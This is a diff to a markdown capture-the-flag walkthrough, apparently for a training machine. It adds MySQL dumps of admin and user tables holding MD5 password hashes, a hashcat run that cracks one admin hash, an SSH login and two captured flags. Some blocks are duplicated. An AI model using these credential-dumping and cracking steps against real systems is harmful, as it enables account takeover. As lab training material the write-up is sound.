@@ -118,25 +118,206 @@ mysql>
 
 ```
 
-<p>Selected the <code>users_db</code>.</p>
+<p>Selected the <code>admin_db</code> database, checked the <code>tables</code> availabled, output <code>admins</code> information.</p>
 
 ```bash
-mysql> show databases;
+mysql> use admin_db;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
 +--------------------+
-| Database           |
+| Tables_in_admin_db |
 +--------------------+
-| admin_db           |
-| information_schema |
-| mysql              |
-| performance_schema |
-| sys                |
-| users_db           |
+| admins             |
 +--------------------+
-6 rows in set (0.00 sec)
+1 row in set (0.00 sec)
+
+mysql> select * from admin;
+ERROR 1146 (42S02): Table 'admin_db.admin' doesn't exist
+mysql> select * from admins;
++----+---------+------------------------------+----------------------------------+------------+---------------------+
+| id | name    | email                        | password                         | role       | created_at          |
++----+---------+------------------------------+----------------------------------+------------+---------------------+
+|  1 | ehxb    | ehxb@thehiddengateway.thm    | 9015d7a0004e724719122195f019debd | superadmin | 2024-11-27 02:33:55 |
+|  2 | salameh | salameh@thehiddengateway.thm | 5f4dcc3b5aa765d61d8327deb882cf99 | admin      | 2024-11-27 02:33:55 |
++----+---------+------------------------------+----------------------------------+------------+---------------------+
+2 rows in set (0.01 sec)
 
 mysql> 
 
 ```
+
+
+```bash
+mysql> use admin_db;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
++--------------------+
+| Tables_in_admin_db |
++--------------------+
+| admins             |
++--------------------+
+1 row in set (0.00 sec)
+
+mysql> select * from admin;
+ERROR 1146 (42S02): Table 'admin_db.admin' doesn't exist
+mysql> select * from admins;
++----+---------+------------------------------+----------------------------------+------------+---------------------+
+| id | name    | email                        | password                         | role       | created_at          |
++----+---------+------------------------------+----------------------------------+------------+---------------------+
+|  1 | ehxb    | ehxb@thehiddengateway.thm    | 9015d7a0004e724719122195f019debd | superadmin | 2024-11-27 02:33:55 |
+|  2 | salameh | salameh@thehiddengateway.thm | 5f4dcc3b5aa765d61d8327deb882cf99 | admin      | 2024-11-27 02:33:55 |
++----+---------+------------------------------+----------------------------------+------------+---------------------+
+2 rows in set (0.01 sec)
+
+mysql> 
+
+```
+
+<p>Navigated to <code>Hashes.com</code></p>
+
+<br>
+
+![image](https://github.com/user-attachments/assets/5bef8900-afb2-451e-89f6-c76069256e65)
+
+<br>
+
+
+![image](https://github.com/user-attachments/assets/fa228cdc-2d6b-4a18-b399-4cc5a1caa303)
+
+
+<br>
+
+
+
+![image](https://github.com/user-attachments/assets/f0bd0a04-9907-4872-b4e6-2616965256a1)
+
+<br>
+
+<p>Used <code>hashcat</code></p>
+
+```bash
+
+:~/TheHiddenGateway# hashcat -m 0 -a 3 5f4dcc3b5aa765d61d8327deb882cf99 /usr/share/wordlists/rockyou.txt
+hashcat (v6.1.1-66-g6a419d06) starting...
+...
+```
+
+![image](https://github.com/user-attachments/assets/d9f89da2-3915-4c6f-bd7a-7881891216fe)
+
+<p>Discovered <code>admin</code>, and <code>superadmin</code> passwords.</p>
+
+
+```bash
+
+:~/TheHiddenGateway# hashcat -m 0 -a 3 5f4dcc3b5aa765d61d8327deb882cf99 /usr/share/wordlists/rockyou.txt
+hashcat (v6.1.1-66-g6a419d06) starting...
+...
+5f4dcc3b5aa765d61d8327deb882cf99:password        
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: MD5
+Hash.Target......: 5f4dcc3b5aa765d61d8327deb882cf99
+Time.Started.....: Sat Mar 22 ... 2025 (0 secs)
+Time.Estimated...: Sat Mar 22 ... 2025 (0 secs)
+Guess.Mask.......: password [8]
+Guess.Queue......: 4/14336792 (0.00%)
+Speed.#1.........:     1064 H/s (0.01ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 1/1 (100.00%)
+Rejected.........: 0/1 (0.00%)
+Restore.Point....: 0/1 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: password -> password
+
+
+```
+
+![image](https://github.com/user-attachments/assets/7b1e15bf-e8ee-4e72-b123-7a5c1e424e44)
+
+<p>Used <code>ssh</code>, and discovered flag 10.</p>
+
+<br>
+
+<h3>FLAG 10  :  FLAG{b21c93b1e8c074d31f1ab9d65d7f95ad}</h3>
+
+![image](https://github.com/user-attachments/assets/741d2a42-1f0d-44c6-a2ac-62f63bd17041)
+
+<br>
+
+<p>Used <code>cat</code> to view <code>HeySalameh.txt</code>´s content.</p>
+
+![image](https://github.com/user-attachments/assets/406b1a2a-af9a-4744-a419-7c561ebd987e)
+
+
+```bash
+
+:~/TheHiddenGateway# hashcat -m 0 -a 3 9015d7a0004e724719122195f019debd /usr/share/wordlists/rockyou.txt
+hashcat (v6.1.1-66-g6a419d06) starting...
+...
+```
+
+
+
+
+
+
+<p>Selected the <code>users_db</code> database.</p>
+
+```bash
+mysql> use users_db;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql>
+
+```
+
+<p>Checked the available <code>tables</code>, selected <code>users</code> table, filtered <code>users</code> information.</p>
+
+```bash
+mysql> show tables;
++--------------------+
+| Tables_in_users_db |
++--------------------+
+| users              |
++--------------------+
+1 row in set (0.00 sec)
+
+mysql> select * from users;
++----+-----------------+--------------------------------------------------+----------------------------------+---------------------+
+| id | name            | email                                            | password                         | created_at          |
++----+-----------------+--------------------------------------------------+----------------------------------+---------------------+
+|  1 | John Doe        | john.doe@thehiddengateway.thm                    | b6a5b813b7ca05eb016b970429728ae4 | 2024-11-27 02:33:55 |
+|  2 | Jane Smith      | jane.smith@thehiddengateway.thm                  | 3e9ea03d7e5a0621f39e787356014e4e | 2024-11-27 02:33:55 |
+|  3 | Michael Brown   | FLAG{eaeb216e0d60a3d9a64fb1c925f83a85} => flag 9 | 57e79c5e82fcd548104a50e6823a1e54 | 2024-11-27 02:33:55 |
+|  4 | Emily Davis     | emily.davis@thehiddengateway.thm                 | 3ec3a146cfe486290f97f288c8ffe00a | 2024-11-27 02:33:55 |
+|  5 | David Wilson    | david.wilson@thehiddengateway.thm                | ce9b2339c03d8a984ae6492e1b0c3db0 | 2024-11-27 02:33:55 |
+|  6 | Sophia Miller   | sophia.miller@thehiddengateway.thm               | c5ec7e8c9ceaf106b0ae926db05c08e0 | 2024-11-27 02:33:55 |
+|  7 | Liam Anderson   | liam.anderson@thehiddengateway.thm               | d699dd200552bacdcd7cfd08c96c21b4 | 2024-11-27 02:33:55 |
+|  8 | Olivia Johnson  | olivia.johnson@thehiddengateway.thm              | 7a179078a0a5a232c64e68ee6894c7e0 | 2024-11-27 02:33:55 |
+|  9 | Daniel Martinez | daniel.martinez@thehiddengateway.thm             | d8819a22459909c36a1bf4249da37454 | 2024-11-27 02:33:55 |
+| 10 | Isabella Garcia | isabella.garcia@thehiddengateway.thm             | b6195665420e1e03cd5f49e424771d92 | 2024-11-27 02:33:55 |
+| 11 | Ethan Thomas    | ethan.thomas@thehiddengateway.thm                | b9a86c7329aa46c799987dbacb6fc209 | 2024-11-27 02:33:55 |
+| 12 | Mason Jackson   | mason.jackson@thehiddengateway.thm               | 3de9165348c8ebd2fb860e35d24ad8b9 | 2024-11-27 02:33:55 |
+| 13 | Ava White       | ava.white@thehiddengateway.thm                   | 53fc7d86d98d7d3b30cc38da6f584d12 | 2024-11-27 02:33:55 |
+| 14 | Lucas Harris    | lucas.harris@thehiddengateway.thm                | 75053c11d24e844728e98ab27062cd1e | 2024-11-27 02:33:55 |
+| 15 | Amelia Lee      | amelia.lee@thehiddengateway.thm                  | cd471ece63ae39103e847822a81af9f4 | 2024-11-27 02:33:55 |
++----+-----------------+--------------------------------------------------+----------------------------------+---------------------+
+15 rows in set (0.00 sec)
+
+mysql> 
+
+```
+
+<p></p>
 
 
 <br>
